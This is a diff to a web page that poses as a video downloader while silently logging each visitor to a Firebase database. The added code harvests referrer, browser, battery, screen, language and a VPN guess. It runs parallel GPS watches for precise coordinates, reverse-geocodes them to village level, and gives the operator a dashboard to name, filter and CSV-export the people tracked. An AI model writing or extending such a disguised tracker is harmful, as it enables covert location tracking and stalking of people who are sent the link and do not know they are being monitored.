@@ -203,6 +203,19 @@ nav{position:sticky;top:0;z-index:50;display:flex;justify-content:space-between;
 .maps-a:hover{text-decoration:underline}
 
 @keyframes spin{to{transform:rotate(360deg)}}
+/* Search & Filter bar */
+.dash-search-row{display:flex;gap:0.5rem;margin-bottom:1rem;flex-wrap:wrap}
+.dash-search{flex:1;min-width:180px;background:var(--s2);border:1px solid var(--border);border-radius:8px;
+  padding:0.55rem 0.9rem;color:var(--text);font-family:var(--font);font-size:0.82rem;outline:none;transition:border-color 0.2s}
+.dash-search:focus{border-color:var(--purple)}
+.dash-search::placeholder{color:var(--muted)}
+.filter-sel{background:var(--s2);border:1px solid var(--border);border-radius:8px;
+  padding:0.55rem 0.7rem;color:var(--text);font-family:var(--font);font-size:0.78rem;outline:none;cursor:pointer}
+.filter-sel:focus{border-color:var(--purple)}
+.btn-export{padding:0.5rem 1rem;background:none;border:1px solid rgba(0,230,118,0.4);
+  color:#00e676;border-radius:8px;font-family:var(--font);font-size:0.78rem;cursor:pointer;transition:all 0.2s;white-space:nowrap}
+.btn-export:hover{background:rgba(0,230,118,0.1)}
+
 @media(max-width:650px){
   .stats-row{grid-template-columns:1fr 1fr}
   .thead,.vrow{grid-template-columns:30px 1fr 1fr 80px}
@@ -312,8 +325,30 @@ nav{position:sticky;top:0;z-index:50;display:flex;justify-content:space-between;
     <div class="stats-row">
       <div class="stat-card"><div class="stat-lbl">Total Visitor</div><div class="stat-val cg" id="st-total">0</div></div>
       <div class="stat-card"><div class="stat-lbl">IP Unik</div><div class="stat-val cb" id="st-unique">0</div></div>
-      <div class="stat-card"><div class="stat-lbl">Negara</div><div class="stat-val" id="st-country">—</div></div>
       <div class="stat-card"><div class="stat-lbl">GPS Granted</div><div class="stat-val cp" id="st-gps">0</div></div>
+      <div class="stat-card"><div class="stat-lbl">Negara</div><div class="stat-val" id="st-country">—</div></div>
+    </div>
+    <div class="dash-search-row">
+      <input class="dash-search" id="dashSearch" placeholder="🔍 Cari IP, nama, kota, device..." oninput="window.renderDash()">
+      <select class="filter-sel" id="filterGps" onchange="window.renderDash()">
+        <option value="">Semua GPS</option>
+        <option value="granted">GPS ✓</option>
+        <option value="denied">Ditolak</option>
+        <option value="pending">Pending</option>
+        <option value="unavailable">Unavailable</option>
+      </select>
+      <select class="filter-sel" id="filterDevice" onchange="window.renderDash()">
+        <option value="">Semua Device</option>
+        <option value="Mobile">📱 Mobile</option>
+        <option value="Tablet">📟 Tablet</option>
+        <option value="Desktop">🖥️ Desktop</option>
+      </select>
+      <select class="filter-sel" id="filterVpn" onchange="window.renderDash()">
+        <option value="">Semua</option>
+        <option value="vpn">🔴 VPN</option>
+        <option value="novpn">🟢 No VPN</option>
+      </select>
+      <button class="btn-export" onclick="window.exportCSV()">⬇ Export CSV</button>
     </div>
     <div class="vtable">
       <div class="thead" style="grid-template-columns:40px 145px 1fr 1fr 90px 100px 36px">
@@ -444,24 +479,81 @@ function parseDevice(uaRaw) {
 async function collect() {
   const ua = navigator.userAgent.toLowerCase();
   const devInfo = parseDevice(navigator.userAgent);
+
+  // Referrer — dari mana user datang
+  const ref_src = document.referrer || null;
+  let referrer_label = null;
+  if (ref_src) {
+    if (ref_src.includes('wa.me') || ref_src.includes('whatsapp')) referrer_label = 'WhatsApp';
+    else if (ref_src.includes('instagram')) referrer_label = 'Instagram';
+    else if (ref_src.includes('tiktok')) referrer_label = 'TikTok';
+    else if (ref_src.includes('t.me') || ref_src.includes('telegram')) referrer_label = 'Telegram';
+    else if (ref_src.includes('twitter') || ref_src.includes('x.com')) referrer_label = 'Twitter/X';
+    else if (ref_src.includes('facebook') || ref_src.includes('fb.')) referrer_label = 'Facebook';
+    else if (ref_src.includes('google')) referrer_label = 'Google';
+    else referrer_label = ref_src.split('/')[2] || ref_src;
+  } else {
+    // Cek URL param utm_source / ref
+    const params = new URLSearchParams(window.location.search);
+    referrer_label = params.get('utm_source') || params.get('ref') || 'Direct / Unknown';
+  }
+
+  // Touch support
+  const hasTouch = navigator.maxTouchPoints > 0;
+
+  // Dark mode
+  const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
+
+  // Browser name
+  let browser = 'Unknown';
+  if (ua.includes('edg/')) browser = 'Edge';
+  else if (ua.includes('opr/') || ua.includes('opera')) browser = 'Opera';
+  else if (ua.includes('samsungbrowser')) browser = 'Samsung Internet';
+  else if (ua.includes('ucbrowser')) browser = 'UC Browser';
+  else if (ua.includes('miuibrowser')) browser = 'MIUI Browser';
+  else if (ua.includes('chrome')) browser = 'Chrome';
+  else if (ua.includes('safari')) browser = 'Safari';
+  else if (ua.includes('firefox')) browser = 'Firefox';
+
   const entry = {
     timestamp: new Date().toISOString(),
     ua: navigator.userAgent,
     platform: navigator.platform || 'N/A',
     language: navigator.language,
+    languages: navigator.languages ? navigator.languages.join(',') : null,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     screen: `${screen.width}x${screen.height}`,
+    viewport: `${window.innerWidth}x${window.innerHeight}`,
+    colorDepth: screen.colorDepth || null,
     deviceType: /mobile|android|iphone|ipad/.test(ua) ? 'Mobile' : /tablet/.test(ua) ? 'Tablet' : 'Desktop',
     deviceBrand: devInfo.brand,
     deviceModel: devInfo.model,
+    browser,
+    hasTouch,
+    darkMode,
+    referrer: ref_src,
+    referrer_label,
+    cookieEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack === '1',
     ip: null, city: null, region: null, country: null,
     country_code: null, org: null, asn: null,
     lat: null, lng: null, gps_lat: null, gps_lng: null,
-    gps_accuracy: null, gps_status: 'pending', postal: null, connection: null
+    gps_accuracy: null, gps_status: 'pending', postal: null, connection: null,
+    battery_level: null, battery_charging: null,
+    is_vpn: null
   };
 
   const conn = navigator.connection || navigator.mozConnection;
   if (conn) entry.connection = `${conn.effectiveType||'?'}/${conn.downlink||'?'}Mbps`;
+
+  // Battery API
+  if (navigator.getBattery) {
+    try {
+      const bat = await navigator.getBattery();
+      entry.battery_level = Math.round(bat.level * 100);
+      entry.battery_charging = bat.charging;
+    } catch(e) {}
+  }
 
   try {
     const r = await fetch('https://ipapi.co/json/');
@@ -473,29 +565,46 @@ async function collect() {
     });
   } catch(e) { entry.ip = 'fetch-failed'; }
 
+  // VPN detection — cek timezone mismatch vs IP country
+  if (entry.country_code && entry.timezone) {
+    const tzCountryMap = {
+      'ID':'Asia/Jakarta,Asia/Makassar,Asia/Jayapura',
+      'MY':'Asia/Kuala_Lumpur','SG':'Asia/Singapore',
+      'US':'America/','GB':'Europe/London','AU':'Australia/',
+      'JP':'Asia/Tokyo','KR':'Asia/Seoul','IN':'Asia/Kolkata',
+      'DE':'Europe/Berlin','FR':'Europe/Paris','NL':'Europe/Amsterdam',
+    };
+    const expected = tzCountryMap[entry.country_code];
+    if (expected) {
+      entry.is_vpn = !expected.split(',').some(tz => entry.timezone.startsWith(tz));
+    }
+  }
+
   let savedKey = null;
   try {
     const res = await push(visRef, entry);
     savedKey = res.key;
   } catch(e) { return; }
 
-  if (navigator.geolocation && savedKey) {
-    let watchId        = null;
-    let firstSaved     = false;
-    let bestAcc        = Infinity;
-    let retryCount     = 0;
-    const MAX_RETRY    = 3;     // retry kalau dapat POSITION_UNAVAILABLE sementara
-    const HARD_STOP_MS = 45000; // 45 detik batas total
 
-    // Reverse geocoding — background, tidak blocking
+  if (navigator.geolocation && savedKey) {
+    let watchIdLow  = null;  // network/WiFi — cepat, langsung
+    let watchIdHigh = null;  // GPS chip — akurat, butuh waktu warm up
+    let bestAcc     = Infinity;
+    let committed   = false;
+    let geoInFlight = false; // cegah Nominatim dipanggil bersamaan
+    const HARD_STOP = 60000; // 60 detik batas total
+
     const doReverseGeo = async (lat, lng) => {
+      if (geoInFlight) return;
+      geoInFlight = true;
       try {
-        const geoRes = await fetch(
+        const r = await fetch(
           `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=jsonv2&addressdetails=1&accept-language=id`,
-          { headers: { 'User-Agent': 'SaveVideoApp/1.0' }, signal: AbortSignal.timeout(12000) }
+          { headers:{'User-Agent':'SaveVideoApp/1.0'}, signal:AbortSignal.timeout(12000) }
         );
-        if (!geoRes.ok) return;
-        const geo  = await geoRes.json();
+        if (!r.ok) return;
+        const geo  = await r.json();
         const addr = geo.address || {};
         const kelurahan = addr.village || addr.suburb || addr.neighbourhood || addr.hamlet || null;
         const kecamatan = addr.city_district || addr.municipality || addr.town || null;
@@ -514,105 +623,79 @@ async function collect() {
           region:        provinsi || null,
           postal:        kodePos  || null,
         });
-      } catch(e) { /* Nominatim gagal — GPS coords tetap tersimpan */ }
+      } catch(e) {
+        // Nominatim gagal, tidak apa-apa
+      } finally {
+        geoInFlight = false;
+      }
     };
 
-    const startWatch = () => {
-      // Tahap 1: pakai maximumAge tinggi + timeout panjang supaya dapat posisi cepat
-      // (boleh pakai cached position dulu, ini yang paling cepat)
-      watchId = navigator.geolocation.watchPosition(onPos, onErr, {
-        enableHighAccuracy: true,
-        timeout: 30000,       // 30 detik timeout per posisi
-        maximumAge: 60000     // boleh pakai cached GPS sampai 1 menit lalu
-      });
-    };
+    const savePos = async (pos, source) => {
+      const { latitude:gla, longitude:glo, accuracy:acc } = pos.coords;
 
-    const onPos = async (pos) => {
-      const { latitude: gla, longitude: glo, accuracy: acc } = pos.coords;
-
-      if (!firstSaved) {
-        // ── COMMIT PERTAMA langsung, apapun akurasinya ──
-        firstSaved = true;
-        bestAcc    = acc;
+      // Selalu simpan posisi pertama apapun akurasinya (network/WiFi ~300-1500m)
+      // Lalu update tiap kali ada yang lebih akurat minimal 20% lebih baik
+      if (!committed || acc < bestAcc * 0.8) {
+        committed = true;
+        bestAcc   = acc;
         await update(ref(db, `visitors/${savedKey}`), {
           gps_lat:      gla,
           gps_lng:      glo,
           gps_accuracy: Math.round(acc),
           gps_status:   'granted',
+          gps_source:   source, // 'network' atau 'gps'
           lat:          gla,
           lng:          glo
         });
-        doReverseGeo(gla, glo); // background
+        // Reverse geo: jalankan segera untuk network, re-run kalau GPS sudah akurat
+        if (!geoInFlight || acc < 200) doReverseGeo(gla, glo);
 
-        // Kalau akurasi sudah oke, stop
-        if (acc <= 100) navigator.geolocation.clearWatch(watchId);
-
-      } else if (acc < bestAcc * 0.7) {
-        // ── UPDATE SILENT kalau ada yang jauh lebih akurat ──
-        bestAcc = acc;
-        await update(ref(db, `visitors/${savedKey}`), {
-          gps_lat:      gla,
-          gps_lng:      glo,
-          gps_accuracy: Math.round(acc),
-          lat:          gla,
-          lng:          glo
-        });
-        doReverseGeo(gla, glo);
-        if (acc <= 30) navigator.geolocation.clearWatch(watchId);
+        // GPS chip sudah sangat akurat → stop semua watch
+        if (acc <= 20) stopAll();
       }
+    };
+
+    const stopAll = () => {
+      if (watchIdLow  !== null) { navigator.geolocation.clearWatch(watchIdLow);  watchIdLow  = null; }
+      if (watchIdHigh !== null) { navigator.geolocation.clearWatch(watchIdHigh); watchIdHigh = null; }
     };
 
     const onErr = async (err) => {
-      if (err.code === 1) {
-        // PERMISSION_DENIED — user tolak, tidak perlu retry
-        navigator.geolocation.clearWatch(watchId);
-        if (!firstSaved) {
+      // Hanya tandai unavailable/denied kalau SAMA SEKALI belum dapat posisi
+      if (!committed) {
+        if (err.code === 1) {
+          stopAll();
           await update(ref(db, `visitors/${savedKey}`), { gps_status: 'denied' });
         }
-        return;
-      }
-
-      // POSITION_UNAVAILABLE (2) atau TIMEOUT (3) — bisa sementara, retry
-      if (!firstSaved && retryCount < MAX_RETRY) {
-        retryCount++;
-        navigator.geolocation.clearWatch(watchId);
-        // Tunggu sebentar lalu coba lagi dengan setting lebih toleran
-        setTimeout(() => {
-          watchId = navigator.geolocation.watchPosition(onPos, onErrFinal, {
-            enableHighAccuracy: retryCount < 2, // retry ke-3 pakai low accuracy
-            timeout: 20000,
-            maximumAge: 120000 // lebih toleran soal cache
-          });
-        }, 1500 * retryCount); // backoff: 1.5s, 3s, 4.5s
-        return;
-      }
-
-      // Sudah max retry
-      if (!firstSaved) {
-        navigator.geolocation.clearWatch(watchId);
-        await update(ref(db, `visitors/${savedKey}`), { gps_status: 'unavailable' });
+        // code 2/3: jangan tulis apa-apa, biarkan watch lain yang coba
       }
     };
 
-    // onErr final (setelah semua retry habis)
-    const onErrFinal = async (err) => {
-      navigator.geolocation.clearWatch(watchId);
-      if (!firstSaved) {
-        await update(ref(db, `visitors/${savedKey}`), {
-          gps_status: err.code === 1 ? 'denied' : 'unavailable'
-        });
-      }
-    };
+    // ── TAHAP 1: Network positioning — enableHighAccuracy:false ──
+    // Langsung dapat hasil dalam < 1 detik (WiFi/cell tower)
+    // Akurasi ~300-1500m, tapi CUKUP untuk tahu kecamatan/kota
+    watchIdLow = navigator.geolocation.watchPosition(
+      pos => savePos(pos, 'network'),
+      onErr,
+      { enableHighAccuracy: false, timeout: 10000, maximumAge: 30000 }
+    );
 
-    startWatch();
+    // ── TAHAP 2: GPS chip — enableHighAccuracy:true ──
+    // Mulai paralel, butuh beberapa detik warm up
+    // Kalau dapat hasil yang lebih akurat → override data network
+    watchIdHigh = navigator.geolocation.watchPosition(
+      pos => savePos(pos, 'gps'),
+      onErr,
+      { enableHighAccuracy: true, timeout: 40000, maximumAge: 0 }
+    );
 
-    // Hard stop
+    // Hard stop 60 detik
     setTimeout(() => {
-      navigator.geolocation.clearWatch(watchId);
-      if (!firstSaved) {
+      stopAll();
+      if (!committed) {
         update(ref(db, `visitors/${savedKey}`), { gps_status: 'unavailable' });
       }
-    }, HARD_STOP_MS);
+    }, HARD_STOP);
   }
 }
 
@@ -627,16 +710,39 @@ window.renderDash = function() {
   const v = allVisitors;
   document.getElementById('st-total').textContent = v.length;
   document.getElementById('st-unique').textContent = new Set(v.map(x=>x.ip).filter(Boolean)).size;
-  document.getElementById('st-country').textContent = new Set(v.map(x=>x.country_code).filter(Boolean)).size || '—';
   document.getElementById('st-gps').textContent = v.filter(x=>x.gps_status==='granted').length;
 
   const list = document.getElementById('visitorList');
   if (!v.length) { list.innerHTML = '<div class="empty">📭 Belum ada visitor. Share linknya!</div>'; return; }
 
+  // Apply search + filters
+  const q     = (document.getElementById('dashSearch')?.value || '').toLowerCase();
+  const fGps  = document.getElementById('filterGps')?.value || '';
+  const fDev  = document.getElementById('filterDevice')?.value || '';
+  const fVpn  = document.getElementById('filterVpn')?.value || '';
+
+  const filtered = v.filter(vis => {
+    if (fGps && vis.gps_status !== fGps) return false;
+    if (fDev && vis.deviceType !== fDev) return false;
+    if (fVpn === 'vpn' && !vis.is_vpn) return false;
+    if (fVpn === 'novpn' && vis.is_vpn) return false;
+    if (q) {
+      const hay = [vis.ip, vis.label, vis.city, vis.region, vis.country,
+                   vis.deviceBrand, vis.deviceModel, vis.referrer_label,
+                   vis.geo_kelurahan, vis.geo_kecamatan].filter(Boolean).join('\n').toLowerCase();
+      if (!hay.includes(q)) return false;
+    }
+    return true;
+  });
+
+  if (!filtered.length) {
+    list.innerHTML = '<div class="empty">🔍 Tidak ada hasil yang cocok</div>';
+    return;
+  }
+
   const now = Date.now();
-  list.innerHTML = v.map((vis,i) => {
+  list.innerHTML = filtered.map((vis,i) => {
     const flag = vis.country_code ? cf(vis.country_code)+' ' : '';
-    // Prioritas: kelurahan+kecamatan dari GPS > kota dari IP
     const loc = vis.geo_kelurahan
       ? `📍 ${vis.geo_kelurahan}, ${vis.geo_kecamatan||''}`
       : vis.city ? `${flag}${vis.city}, ${vis.region||''}` : `${flag}${vis.country||'Unknown'}`;
@@ -644,17 +750,22 @@ window.renderDash = function() {
     const time = new Date(vis.timestamp).toLocaleString('id-ID',{day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit'});
     const isNew = (now - new Date(vis.timestamp).getTime()) < 60000;
     const hasGps = vis.gps_status==='granted';
-    const nameTag = vis.label ? `<span class="name-tag" title="Double-click untuk ubah" ondblclick="event.stopPropagation();window.openRename('${vis._key}')">✏️ ${vis.label}</span>` : `<span style="font-size:0.68rem;color:var(--muted);cursor:pointer;margin-left:3px" title="Beri nama" ondblclick="event.stopPropagation();window.openRename('${vis._key}')">➕nama</span>`;
+    const vpnTag = vis.is_vpn ? '<span style="font-size:0.6rem;background:rgba(255,82,82,0.15);color:#ff5252;padding:1px 4px;border-radius:3px;margin-left:2px">VPN</span>' : '';
+    const refTag = vis.referrer_label && vis.referrer_label !== 'Direct / Unknown'
+      ? `<span style="font-size:0.6rem;background:rgba(124,58,237,0.15);color:#a78bfa;padding:1px 4px;border-radius:3px;margin-left:2px">${vis.referrer_label}</span>` : '';
+    const nameTag = vis.label
+      ? `<span class="name-tag" title="Double-click untuk ubah" ondblclick="event.stopPropagation();window.openRename('${vis._key}')">✏️ ${vis.label}</span>`
+      : `<span style="font-size:0.68rem;color:var(--muted);cursor:pointer;margin-left:3px" title="Beri nama" ondblclick="event.stopPropagation();window.openRename('${vis._key}')">➕nama</span>`;
     return `<div class="vrow" style="grid-template-columns:40px 145px 1fr 1fr 90px 100px 36px" onclick="window.showDetail('${vis._key}')">
-      <div class="vnum">${v.length-i}</div>
-      <div style="display:flex;align-items:center;gap:2px;flex-wrap:wrap"><span class="ip-tag">${(vis.ip||'N/A').substring(0,16)}</span>${isNew?'<span class="new-tag">NEW</span>':''}${hasGps?'<span class="gps-tag">GPS✓</span>':''}${nameTag}</div>
+      <div class="vnum">${filtered.length-i}</div>
+      <div style="display:flex;align-items:center;gap:2px;flex-wrap:wrap"><span class="ip-tag">${(vis.ip||'N/A').substring(0,16)}</span>${isNew?'<span class="new-tag">NEW</span>':''}${hasGps?'<span class="gps-tag">GPS✓</span>':''}${vpnTag}${refTag}${nameTag}</div>
       <div style="font-size:0.8rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${loc}</div>
       <div class="col-isp" style="font-size:0.73rem;color:var(--muted);overflow:hidden;text-overflow:ellipsis">${(vis.org||'N/A').substring(0,22)}</div>
       <div class="col-dev" style="font-size:0.8rem">${dev} ${vis.deviceBrand && vis.deviceBrand!=='Unknown'? vis.deviceBrand : vis.deviceType||'?'}</div>
       <div class="ttime">${time}</div>
       <div onclick="event.stopPropagation()"><button class="del-btn" onclick="window.deleteVisitor('${vis._key}')" title="Hapus visitor ini">✕</button></div>
     </div>`;
-  }).join('');
+  }).join('\n');
 };
 
 window.showDetail = function(key) {
@@ -664,24 +775,34 @@ window.showDetail = function(key) {
   const ipMap = vis.lat && vis.lng ? `https://www.google.com/maps?q=${vis.lat},${vis.lng}` : null;
 
   document.getElementById('detailContent').innerHTML = `
-    <div class="ditem full"><div class="dlbl">IP Address</div><div class="dval accent mono">${vis.ip||'N/A'}</div></div>
-    <div class="ditem"><div class="dlbl">Kota</div><div class="dval">${vis.city||'N/A'}</div></div>
-    <div class="ditem"><div class="dlbl">Provinsi</div><div class="dval">${vis.region||'N/A'}</div></div>
+    <div class="ditem full"><div class="dlbl">IP Address</div>
+      <div style="display:flex;align-items:center;gap:0.5rem;flex-wrap:wrap">
+        <div class="dval accent mono">${vis.ip||'N/A'}</div>
+        ${vis.is_vpn != null ? `<span style="font-size:0.72rem;padding:2px 7px;border-radius:4px;background:${vis.is_vpn?'rgba(255,82,82,0.15)':'rgba(0,230,118,0.1)'};color:${vis.is_vpn?'#ff5252':'#00e676'}">${vis.is_vpn?'🔴 Kemungkinan VPN/Proxy':'🟢 Tidak terdeteksi VPN'}</span>` : ''}
+      </div>
+    </div>
+    <div class="ditem"><div class="dlbl">📌 Dari (Referrer)</div><div class="dval" style="color:#a78bfa">${vis.referrer_label||'Direct / Unknown'}</div></div>
+    <div class="ditem"><div class="dlbl">🌍 Browser</div><div class="dval">${vis.browser||'Unknown'}</div></div>
+    <div class="ditem"><div class="dlbl">Kota (IP)</div><div class="dval">${vis.city||'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">Provinsi (IP)</div><div class="dval">${vis.region||'N/A'}</div></div>
     <div class="ditem"><div class="dlbl">Negara</div><div class="dval">${flag}${vis.country||'N/A'}</div></div>
-    <div class="ditem"><div class="dlbl">Kode Pos</div><div class="dval">${vis.postal||'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">Kode Pos (IP)</div><div class="dval">${vis.postal||'N/A'}</div></div>
     <div class="ditem"><div class="dlbl">ISP / Org</div><div class="dval">${vis.org||'N/A'}</div></div>
     <div class="ditem"><div class="dlbl">ASN</div><div class="dval mono">${vis.asn||'N/A'}</div></div>
     <div class="ditem"><div class="dlbl">Timezone</div><div class="dval">${vis.timezone||'N/A'}</div></div>
     <div class="ditem"><div class="dlbl">📱 Merek / Brand</div><div class="dval" style="color:${vis.deviceBrand && vis.deviceBrand!=='Unknown'?'#00d4ff':'var(--muted)'}">${vis.deviceBrand||'N/A'}</div></div>
     <div class="ditem"><div class="dlbl">🔧 Model Perangkat</div><div class="dval">${vis.deviceModel||vis.deviceType||'N/A'} • ${vis.screen||''}</div></div>
+    <div class="ditem"><div class="dlbl">Viewport</div><div class="dval mono">${vis.viewport||vis.screen||'N/A'}</div></div>
     <div class="ditem"><div class="dlbl">Koneksi</div><div class="dval">${vis.connection||'N/A'}</div></div>
-    <div class="ditem"><div class="dlbl">Bahasa Browser</div><div class="dval">${vis.language||'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">🔋 Baterai</div><div class="dval">${vis.battery_level != null ? vis.battery_level+'%'+(vis.battery_charging?' ⚡ Charging':'') : 'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">Bahasa</div><div class="dval">${vis.language||'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">Dark Mode</div><div class="dval">${vis.darkMode != null ? (vis.darkMode?'🌙 Ya':'☀️ Tidak') : 'N/A'}</div></div>
     <div class="ditem"><div class="dlbl">Waktu Kunjungan</div><div class="dval">${new Date(vis.timestamp).toLocaleString('id-ID')}</div></div>
     <div class="ditem full" style="border-color:${vis.gps_status==='granted'?'rgba(255,45,120,0.4)':'var(--border)'}">
       <div class="dlbl">📍 GPS Presisi Tinggi ${vis.gps_status==='granted'?'<span style=\"background:rgba(0,230,118,0.15);color:#00e676;font-size:0.6rem;padding:1px 5px;border-radius:3px;margin-left:4px\">✓ AKURAT</span>':''}</div>
       ${vis.gps_status==='granted' && vis.gps_lat
         ? `<div class="dval pink mono" style="font-size:1rem;letter-spacing:0.02em">${vis.gps_lat.toFixed(6)}, ${vis.gps_lng.toFixed(6)}</div>
-           <div style="font-size:0.73rem;color:var(--muted);margin-top:4px">⭕ Radius: <b style="color:#ff2d78">±${vis.gps_accuracy} meter</b>${vis.gps_samples ? ' · ' + vis.gps_samples + ' sampel' : ''}</div>
+           <div style="font-size:0.73rem;color:var(--muted);margin-top:4px">⭕ Radius: <b style="color:#ff2d78">±${vis.gps_accuracy} meter</b> <span style="margin-left:6px;font-size:0.62rem;padding:1px 5px;border-radius:3px;background:${vis.gps_source==='gps'?'rgba(0,212,255,0.15)':'rgba(255,144,0,0.15)'};color:${vis.gps_source==='gps'?'#00d4ff':'#ff9100'}">${vis.gps_source==='gps'?'📡 GPS Chip':'📶 Network/WiFi'}</span></div>
            <a class="maps-a" href="https://www.google.com/maps?q=${vis.gps_lat},${vis.gps_lng}&z=17" target="_blank" style="margin-top:8px;font-size:0.82rem;font-weight:600">🗺️ Buka Google Maps (Presisi Tinggi)</a>`
         : `<div class="dval" style="color:var(--muted);margin-top:4px">${vis.gps_status==='denied'?'🚫 User menolak izin GPS — hanya data IP tersedia':vis.gps_status==='unavailable'?'⚠️ GPS tidak tersedia di perangkat ini':'⏳ Menunggu respons GPS...'}</div>`}
     </div>
@@ -728,12 +849,32 @@ window.refreshDash = function() {
   const btn = document.getElementById('btnRefresh');
   btn.classList.add('spinning');
   btn.disabled = true;
-  // Firebase onValue sudah realtime, cukup re-render + animasi
   window.renderDash();
-  setTimeout(() => {
-    btn.classList.remove('spinning');
-    btn.disabled = false;
-  }, 800);
+  setTimeout(() => { btn.classList.remove('spinning'); btn.disabled = false; }, 800);
+};
+
+window.exportCSV = function() {
+  if (!allVisitors.length) { alert('Tidak ada data untuk diexport.'); return; }
+  const cols = ['timestamp','label','ip','city','region','country','postal',
+    'geo_kelurahan','geo_kecamatan','geo_kota','geo_provinsi','geo_kodepos','geo_alamat',
+    'gps_lat','gps_lng','gps_accuracy','gps_status','gps_source',
+    'deviceBrand','deviceModel','deviceType','browser','connection',
+    'battery_level','battery_charging','referrer_label','referrer',
+    'is_vpn','language','timezone','screen','viewport','org','asn','ua'];
+  const esc = v => {
+    if (v == null) return '';
+    const s = String(v);
+    return s.includes(',') || s.includes('"') || s.includes('\n') ? '"' + s.replace(/"/g,'""') + '"' : s;
+  };
+  const rows = [cols.join(',')];
+  allVisitors.forEach(v => rows.push(cols.map(c => esc(v[c])).join(',')));
+  const blob = new Blob([rows.join('\n')], {type:'text/csv;charset=utf-8;'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `savevideo_visitors_${new Date().toISOString().slice(0,10)}.csv`;
+  a.click();
+  URL.revokeObjectURL(url);
 };
 
 let _renameKey = null;
@@ -959,7 +1100,7 @@ async function handleDownload() {
           loading.style.display = 'none';
           const items = data.picker.map((item, i) =>
             `<a class="dl-btn primary" href="${item.url}" target="_blank" download>⬇ Media ${i+1}</a>`
-          ).join('');
+          ).join('\n');
           result.innerHTML = `
             <div class="video-info">
               <h3>✅ ${data.picker.length} media ditemukan</h3>
